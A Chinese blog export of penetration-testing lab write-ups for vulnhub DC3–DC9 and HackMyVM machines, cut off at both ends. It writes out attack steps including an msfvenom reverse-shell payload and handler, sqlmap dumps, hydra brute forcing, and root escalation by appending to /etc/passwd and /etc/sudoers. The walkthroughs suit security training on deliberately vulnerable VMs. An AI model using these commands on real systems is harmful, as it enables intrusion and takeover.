<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a403fd0e0a243d4f87a5a.png"><br>提示密码存在一个.txt文件中  用户名是 medusa   并且给了一个摩丝密码 nothing<br>现在进行目录扫描<br><img src="https://pic1.imgdb.cn/item/679a4044d0e0a243d4f87a5b.png"><br>这里给了三个重定向的目录 一次访问试试</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/</span></span><br><span class="line">Maybe my password is in this secret folder?</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/home/  </span></span><br><span class="line">Maybe my pass is at home!</span><br><span class="line">-medusa</span><br><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/admin/</span></span><br><span class="line"><span class="variable">&lt;html&gt;</span></span><br><span class="line"><span class="variable">&lt;head&gt;</span><span class="variable">&lt;title&gt;</span>403 Forbidden<span class="variable">&lt;/title&gt;</span><span class="variable">&lt;/head&gt;</span></span><br><span class="line"><span class="variable">&lt;body bgcolor=&quot;white&quot;&gt;</span></span><br><span class="line"><span class="variable">&lt;center&gt;</span><span class="variable">&lt;h1&gt;</span>403 Forbidden<span class="variable">&lt;/h1&gt;</span><span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;hr&gt;</span><span class="variable">&lt;center&gt;</span>nginx/1.14.2<span class="variable">&lt;/center&gt;</span></span><br><span class="line"><span class="variable">&lt;/body&gt;</span></span><br><span class="line"><span class="variable">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>提示密码在secret目录中 又在文件home中所以访问&#x2F;secret&#x2F;home&#x2F;</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/alz]</span><br><span class="line">└─<span class="comment"># curl 192.168.240.224/secret/home/</span></span><br><span class="line"></span><br><span class="line">Im trying a lot. Im sure <span class="keyword">that</span> i will recover <span class="keyword">my</span> pass!</span><br><span class="line"></span><br><span class="line">-medusa</span><br></pre></td></tr></table></figure></div>
<p>还是没有直接的密码<br>没有思路查看wp后才知道密码藏在ftp里面 但是是在knock之后过的ftp中  这个老六。。。<br><img src="https://pic1.imgdb.cn/item/679a4045d0e0a243d4f87a5d.png"><br>这个就是medusa的密码<br><img src="https://pic1.imgdb.cn/item/679a4047d0e0a243d4f87a5e.png"><br>拿到shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="https://pic1.imgdb.cn/item/679a407ed0e0a243d4f87a61.png"><br>发现有sudo命令  但是这个无法提权<br>继续查suid文件<br><img src="https://pic1.imgdb.cn/item/679a4083d0e0a243d4f87a64.png"><br>搜索都可以用capsh提权<br><img src="https://pic1.imgdb.cn/item/679a407fd0e0a243d4f87a62.png"><br><img src="https://pic1.imgdb.cn/item/679a4082d0e0a243d4f87a63.png"><br>拿到flag</p>
<p>密码存在knock之后的ftp的文件中也太阴险了。。。</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>DC5靶场复盘</title>
    <url>/posts/19078.html</url>
    <content><![CDATA[<p>vulnhub-DC5靶场复盘</p>
<span id="more"></span>
<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>这题的靶场提示要在web找到刷新改变的东西<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>这个靶机只有一个80端口 没有22ssh端口<br>而且这个网站没有用cms  是一个静态的页面</p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>在contact us 里有输入框 用sqlmap 扫描之后没有注入点<br>在contact us 输入内容返回的thank you.php 界面刷新 发现下面的footer会刷新 查看页面源代码<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>这个界面是有一个footer.php的 所以这里有一个文件包含漏洞  因为是其他有调用这个footer.php<br>但是现在不知道用什么关键字访问到包含文件  所以我们用wfuzz跑关键字<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>找到了关键字是file  现在就可以访问服务器中的文件了   <strong>现在的又一个难题是只能看到文件如何才能拿到shell呢</strong><br>我们知道如果可以写入一个一句话木马就可以拿到shell   但是应该用什么方式实现呢？<br>用apache2服务访问的日志 错误日志也会存 存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log 中  这里没有我们就用nginx<br>下一步就是用bp修改<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>这一条记录会在access.log中<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>我们的标记存在 而且后面的php代码没有显示出来 说明被成功解析了  用蚁剑连接shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在上一步拿到蚁剑的shell之后反弹到本机中<br>提权思路还是找到存在漏洞的服务<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>这里有一个screen服务而且告诉了版本号 大概率就是利用这个<br>然后用wget 从靶机下载本机的这个脚本  <mark>注意这个脚本不能再www目录下运行  在其他目录下wget</mark><br>运行之后拿到root权限 解决！！！ </p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>DC6靶场复盘</title>
    <url>/posts/35203.html</url>
    <content><![CDATA[<p>vulnhub-DC6靶场复盘</p>
<span id="more"></span>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>首先要根据vulnhub上面的提示  修改本机和kali的host文件<br>给了一个提示<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f5.png"><br>让我们扫描 先把指定的密码字典存起来   我们用bp爆破管理员账户</p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>这个站点是用wordpress创建的 可以访问readme.html 就可以看到哪里是登录界面 一般还会有版本信息<br><img src="https://pic1.imgdb.cn/item/679a1d0ed0e0a243d4f875f6.png" alt="|450"></p>
<p>后台登录界面就在&#x2F;wp-admin  现在就是爆破 用admin爆破    我们尝试了爆破 但是无法得到密码<br>现在用wpscan扫描 指定url 和apitoken    然后枚举用户名   <code>wpscan --url wordy --enumerate u</code><br>然后把得到的用户名存在一个文件里面  爆破用户名和密码 </p>
<p>接着就可以登录到管理员账户<br>然后利用web上的信息拿到shell 这里要用到插件的activity monitor 插件漏洞 用searchsploit<br><img src="https://pic1.imgdb.cn/item/679a1d14d0e0a243d4f875f7.png" alt="|500"><br>利用这个漏洞   修改payload 上传到本机 在web端访问<br><img src="https://pic1.imgdb.cn/item/679a1d16d0e0a243d4f875f8.png" alt="|425"><br>然后在web端点击这个文件 就可以拿到shell<br><img src="https://pic1.imgdb.cn/item/679a1d17d0e0a243d4f875f9.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这个www用户目录下面其实没有什么有用的东西   &#x3D;&#x3D;去&#x2F;home&#x2F;&#x3D;&#x3D; 目录下   这里可以看到其他几个用户的文件夹<br>找到jens用户 目录下有一个backup.sh<br><code>ls -al backups.sh</code><br><code>-rwxrwxr-x 1 jens devs 50 Apr 26  2019 backups.sh</code><br>可以看到devs组的人有rwx权限 所有用户都有x权限<br>然后在mark用户的文件夹下面有一个stuff文件夹 里面有一个账号密码 可以登录到ssh<br><img src="https://pic1.imgdb.cn/item/679a1d5cd0e0a243d4f87600.png"><br><code>graham@dc-6:~$ id</code><br><code>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)</code><br>这个用户是属于devs这个组的 所以有写入文件的权限<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87601.png" alt="|500"><br>可以发现这个用户可以不用密码就用jens用户的名义执行刚才的那个脚本<br>我们先在那个脚本文件后面加上<code>graham@dc-6:~$ echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</code><br>这样子就可以让执行脚本的人返回shell   这样子就拿到了jens的shell<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87602.png" alt="|450"><br>这个用户可以用root身份执行 nmap  所以用nmap提权<br>在网上找资料后 发现nmap可以用srcipt提权<br><img src="https://pic1.imgdb.cn/item/679a1d9dd0e0a243d4f87604.png" alt="|500"><br>或者可以把’os.execute(“&#x2F;bin&#x2F;bash”) 写到一个s.nse文件里 然后–script 传入这个文件</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>DC4靶场复盘</title>
    <url>/posts/52100.html</url>
    <content><![CDATA[<p>vulnhub-DC4靶场复盘</p>
<span id="more"></span>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>这个靶机开放80和22端口   没有什么多余信息</p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a1f99d0e0a243d4f87640.png" alt="|400"><br>只有一个登录界面  只能爆破  用bp爆破得到admin密码 登入管理员界面<br><img src="https://pic1.imgdb.cn/item/679a20f5d0e0a243d4f87658.png" alt="|500"><br><img src="https://pic1.imgdb.cn/item/679a20f6d0e0a243d4f87659.png" alt="|825"><br>这里的界面可以运行一些shell的指令 猜测在页面的请求包里面有指令 用bp试试<br><img src="https://pic1.imgdb.cn/item/679a20f7d0e0a243d4f8765a.pngg" alt="500"><br>发现果然是  空格用+绕过 现在就把指令变成反弹shell  拿到www的shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这题提权方式有很多种</p>
<h3 id="1用exim漏洞"><a href="#1用exim漏洞" class="headerlink" title="1用exim漏洞"></a>1用exim漏洞</h3><p>步骤和DC8一模一样</p>
<h3 id="2访问不同用户的信息"><a href="#2访问不同用户的信息" class="headerlink" title="2访问不同用户的信息"></a>2访问不同用户的信息</h3><p><img src="https://pic1.imgdb.cn/item/679a20f8d0e0a243d4f8765b.png"><br>在home目录下面有三个用户<br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765e.png" alt="|500"><br>jim这里有一个只有jim可以读写的文件 肯定有东西   在目录backups下面有一些密码<br>现在用爆破看看是否能登录jim的ssh<br>通过hydra成功进入ssh <code>hydra -l jim -P pass.txt ssh://192.168.240.249</code><br><img src="https://pic1.imgdb.cn/item/679a2129d0e0a243d4f8765f.png"><br>登录到jim看到mbox中的内容是一封邮件 但是没有什么有用的信息<br>到&#x2F;var&#x2F;mail路径下 看到有一个jim邮件  里面有另一个用户的密码  登录到charles中 (这里邮件中的C是大写的 但是登录ssh要用小写c不知道为什么)<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87660.png" alt="|500"><br>发现这个用户有一个用root执行teehee的权限<br>有两种方式用teehee提权  一种是<br> <code>echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</code><br><mark>可以看到teehee可以把一个语句加到某个文件里面</mark>  这里是新建了一个用户有了root权限<br>也可以用teehee把charles变成一个超级用户 写到&#x2F;etc&#x2F;sudoers 中<br> <code>echo &quot;charles ALL=(ALL:ALL) ALL&quot; | sudo teehee -a /etc/sudoers</code><br>这里sudo要写在分隔符后面 因为是有root权限执行teehee</p>
<h2 id="用test-sh"><a href="#用test-sh" class="headerlink" title="用test.sh"></a>用test.sh</h2><p>刚才jim目录下有一个test.sh 文件 权限是-rwsrwxrwx<br><img src="https://pic1.imgdb.cn/item/679a212ad0e0a243d4f87661.png" alt="|500"><br><strong>SUID (Set User ID)</strong>：</p>
<ul>
<li>当文件的执行权限中出现 <code>s</code> （在所有者权限位置），表示该文件是设置了 SUID 权限。SUID 权限让用户执行这个文件时，程序以文件所有者的权限运行，而不是以执行它的用户的权限运行。</li>
<li>例如，如果文件的所有者是 <code>root</code>，那么无论哪个用户执行该文件，都会以 <code>root</code> 权限运行它。<br>所以可以在文件后面加上一句反弹shell  用root身份执行 就可以拿到rootshell<br><img src="https://pic1.imgdb.cn/item/679a212bd0e0a243d4f87662.png"></li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>DC8靶场复盘</title>
    <url>/posts/51727.html</url>
    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
<span id="more"></span>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>DC9靶场复盘</title>
    <url>/posts/14257.html</url>
    <content><![CDATA[<p>vulnhub-DC9靶场复盘</p>
<span id="more"></span>

<h1 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h1><p>先nmap扫描本机 发现靶机的地址  (这里虚拟机的网络都要用桥接模式，扫描本机网段)<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/28311c0ca1354b2e.png" alt="|450"><br>靶机一般是最后数字大的 192.168.240.171<br>接着扫描靶机 发现有两个端口 22 和 80   22还是被防火墙过滤的<br>用dirsearch -u [ip]  扫描目录     –&gt; 最后什么都没有扫到</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>发现有一个登录界面 用户名是admin 用bp爆破无法得到正确的密码<br>并且search有一个输入框<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/f81f33ccbd3d01ca.png" alt="|425"><img src="https://s3.bmp.ovh/imgs/2025/01/29/7a426990d44cebb4.png" alt="|475"><br>这个搜索框是一个post请求  在这里可以使用sqlmap进行sql注入<br>在这里我们使用-u 和 –data “search&#x3D;1” 这里是post类型注入 自动画操作再加上–batch<br>查询之后 在上一条指令后面加上–dbs就可以查到数据库<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/f9bc162ab156b944.png" alt="|525"><br>一步一步扫描 刚才是数据库 现在就是指定数据库 查表 后面就是查列<br>-D users –tables  - T *** –columns<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/158b8293575e9909.png" alt="|400"><br>现在要查询用户名和密码字段 用-C “username,password” –dump<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/340563e3e3b4f104.png" alt="|350"><br>找到一系列用户名和密码<br>然后我们定位到csv文件里 用awk 做一个分割  分别存进user.txt pass.txt<br>现在这里没有类似admin之类的用户 我们现在去另外一个数据库里继续查询<br>然后可以发现一个admin用户  将md5放在网站中破解<br>得到密码之后 可以登录网站的manager界面 在添加记录这里尝试添加’ # 看看有没有报错<br>发现在邮箱这边确实会出现报错<br><img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b1.png"><br> 同时还可以看到不存在 –&gt; 文件包含漏洞<br> <img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b2.png"><br> <mark>下一步就要用web登录到服务器</mark><br> 我们在url这里输入?file&#x3D; ..&#x2F;..&#x2F;etc&#x2F;passwd 一直尝试相对路径<br> 接着用bp来获取他的真实路径   在bp浏览器中登录管理员账户<br> <img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b3.png"><br> 在bp包中把file&#x3D;后面加上$  然后在payload里面加上相对路径<br> <img src="https://pic1.imgdb.cn/item/6799dc7ed0e0a243d4f870b4.png" alt="|500"><br> 根据返回的长度就可以得到真实路径<br> <img src="https://pic1.imgdb.cn/item/6799dc7ed0e0a243d4f870b5.png" alt="|500"><br> 然后我们到真实的路径下面 因为知道有ssh服务 所以可以查看ssh配置文件  发现不允许root登录 listen也没有配置<br> 因为之前我们知道22端口被防火墙过滤了 我们猜测有knockd服务 在&#x2F;proc&#x2F;sched_debug 里面可以看到所以配置的服务<br> <img src="https://pic1.imgdb.cn/item/6799dce1d0e0a243d4f870ba.png" alt="|475"><br> 把这些信息都放到kali a.txt 用正则表达式过滤 cat a.txt | egrep ‘[a-zA-z]+’ 这样子可以搜索服务 -o输出匹配内容 在sort排序 （还可以uniq去重） 发现有knockd这个服务<br> 然后访问etc&#x2F;knockd.conf<br> <img src="https://pic1.imgdb.cn/item/6799dce1d0e0a243d4f870bb.png"><br> 可以看到knock服务的访问顺序是 9842 8475 7469   然后用nc或者kali自带的knock(注意没有d来访问<br> 然后我们就发现这个22端口现在已经开放了<br> 现在用刚才的user 和 pass文件  用hydra爆破<br> hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;192.168.240.171</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>然后拿到一些普通用户 我们进去看看有什么文件<br><img src="https://pic1.imgdb.cn/item/6799ddc3d0e0a243d4f870cc.png" alt="|475"><br>登录之后没有发现什么任何文件<br><img src="https://pic1.imgdb.cn/item/6799ddc3d0e0a243d4f870cd.png" alt="|450"><br>我们要输入<mark>sudo -l</mark> 查看是否有什么文件夹有root权限 发现这个用户什么都没有<br>登录到最后一个账户里面发现有一个新的文件 里面有新的密码<br><img src="https://pic1.imgdb.cn/item/6799dce5d0e0a243d4f870bd.png" alt="|475"><br>把这些密码放到pass.txt 中 再用hydra 跑一遍<br>登入到新的用户<br>输入root -l 之后发现有一个root组的文件<br><img src="https://pic1.imgdb.cn/item/6799dce4d0e0a243d4f870bc.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/6799dce6d0e0a243d4f870be.png" alt="|375"><br>这个脚本接受两个参数 读第一个文件的内容 然后添加到第二个文件里<br>我们现在就加到etc&#x2F;sudoers 添加权限   现在就新建一个文件夹 然后添加root的权限(ALL&#x3D;(ALL:ALL) ALL)<br>这里我们要在主文件夹下面写这个文件  因为刚才test脚本在的地方是有root权限的<br>然后用刚才的脚本把a.txt 写入 etc&#x2F;sudoers<br>输入sudo su -<br><img src="https://pic1.imgdb.cn/item/6799dd8bd0e0a243d4f870c9.png" alt="|400"><br>解决！！</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">codeblock</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>DC3靶场复盘</title>
    <url>/posts/35983.html</url>
    <content><![CDATA[<p>vulnhub-DC3靶场复盘</p>
<span id="more"></span>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a237dd0e0a243d4f8768f.png" alt="|450"><br>nmap扫描这个端口之后 可以得到一些更重要的信息   比如这个网站用的cms是joomla<br>用searchsploit可以发现有非常多的漏洞  百度之后发现有一个扫描器 joomscan</p>
<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87690.png" alt="|450"><br>web界面只有一个登录界面 可以尝试直接爆破 但是从结果来说 确实可以爆破 而且账户也存在<br>但是这里不是实际的管理界面<br><img src="https://pic1.imgdb.cn/item/679a237ed0e0a243d4f87691.png"><br>用joomscan可以找到真实的管理员登录界面   我们用password.lst 爆破可以得到密码<br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87692.png" alt="|475"><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|500"><br>这个管理界面没有可以注入的点<br><img src="https://pic1.imgdb.cn/item/679a23e3d0e0a243d4f8769b.png" alt="|475"><br>在模板中 可以看到php文件 我们可以在index.php中直接插入php代码  比如phpinfo() 到网站首页之后发现成功了<br>（这里如果要在index中插入必须要是用的和网站现在用的模板一样才可以  如果在html文件夹里面插入就不用管<br>然后上传php一句话木马 用蚁剑连接 拿到webshell<br>但是这里没有nc指令 我们要用到msfconsole<br> 先输入msfconsole进入命令面板   <code>use payload/php/meterpreter/reverse_tcp</code><br><img src="https://pic1.imgdb.cn/item/679a237fd0e0a243d4f87693.png" alt="|450"><br>然后需要用<mark>msfvenom</mark>生成攻击文件<br>  <code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.240.11 lport=1234 &gt; a.php </code><br>接着回到msfconsole  用 <code>use exploit/multi/handler</code>  这是一个监听器  然后设置payload  <code>set payload php/meterpreter/reverse_tcp</code><br>show options 查看需要配置什么<br> <code>set lhost 192.168.240.11</code>  <code>set lpost 1234</code>   最后run就可以了<br>在web界面刷新刚才插入payload php代码的界面  就可以在msf中看到成功连接了<br><img src="https://pic1.imgdb.cn/item/679a23e5d0e0a243d4f8769d.png" alt="|500"><br>输入shell 进入</p>
<h3 id="2用joomla漏洞-非爆破"><a href="#2用joomla漏洞-非爆破" class="headerlink" title="2用joomla漏洞 (非爆破)"></a>2用joomla漏洞 (非爆破)</h3><p>用searchsploit 搜索joomla + 版本号<br>这个脚本告诉我们了sqlmap使用的sqlmap<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a2.png"><br>到columns这里要注意一点 这里用自动就什么都没有  而且因为这个表名有# 有用引号括起来<br><img src="https://pic1.imgdb.cn/item/679a2415d0e0a243d4f876a3.png" alt="|500"><br>同样可以得到这个密码</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>可以做一些常规的操作比如suid  系统漏洞等  suid没有可以利用的 但是系统比较老 可以用内核提权<br>.linux系统漏洞提权<br>先在webshell里面用<code>cat /etc/*releas</code> 得到当前ubuntu系统的版本号  DISTRIB_RELEASE&#x3D;16.04<br><code>uname -a</code> 查看内核版本   Linux DC-3 4.4.0-21-generic<br>然后用searchsploit 找到漏洞利用脚本（必须同时满足系统和内核版本）  这里给的网址已经失效 需要我们去仓库 找到新的地方<br>把下载下来的文件用scp复制到kali 的&#x2F;var&#x2F;www&#x2F;html中  然后在webshell用wget下载这个利用脚本<br>解压之后 运行脚本就可以提权了<br><img src="https://pic1.imgdb.cn/item/679a23e6d0e0a243d4f8769f.png" alt="|475"></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Driftingblues</title>
    <url>/posts/50762.html</url>
    <content><![CDATA[<p>HMV-Driftingblues靶场复盘</p>
<span id="more"></span>
<h1 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描 &#x2F; 信息收集"></a>端口扫描 &#x2F; 信息收集</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.58.44             </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>3-<span class="number">08</span> <span class="number">21</span>:<span class="number">02</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">58.44</span>)</span><br><span class="line">Host is up (<span class="number">0.026</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span> open  ftp     vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line">| <span class="params">ftp-syst:</span> </span><br><span class="line">|   <span class="params">STAT:</span> </span><br><span class="line">| FTP server <span class="params">status:</span></span><br><span class="line">|      Connected to ::ffff:<span class="number">192.168</span>.<span class="number">58.11</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="params">TYPE:</span> ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was <span class="number">1</span></span><br><span class="line">|      vsFTPd <span class="number">3.0</span>.<span class="number">3</span> <span class="operator">-</span> secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| <span class="params">ftp-anon:</span> Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">|_-rwxrwxrwx    <span class="number">1</span> <span class="number">0</span>        <span class="number">0</span>             <span class="number">471</span> Sep <span class="number">19</span>  <span class="number">2021</span> respectmydrip.zip [<span class="params">NSE:</span> writeable]</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">8.2</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">3072</span> <span class="number">9</span>e:bb:af:<span class="number">6</span>f:<span class="number">7</span>d:a7:<span class="number">9</span>d:<span class="number">65</span>:a1:b1:a1:be:<span class="number">91</span>:cd:<span class="number">04</span>:<span class="number">28</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> a3:d3:c0:b4:c5:f9:c0:<span class="number">6</span>c:e5:<span class="number">47</span>:<span class="number">64</span>:fe:<span class="number">91</span>:c5:cd:c0 (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">4</span>c:<span class="number">84</span>:da:<span class="number">5</span>a:ff:<span class="number">04</span>:b9:b5:<span class="number">5</span>c:<span class="number">5</span>a:be:<span class="number">21</span>:b6:<span class="number">0</span>e:<span class="number">45</span>:<span class="number">73</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">41</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.41</span> (Ubuntu)</span><br><span class="line">| 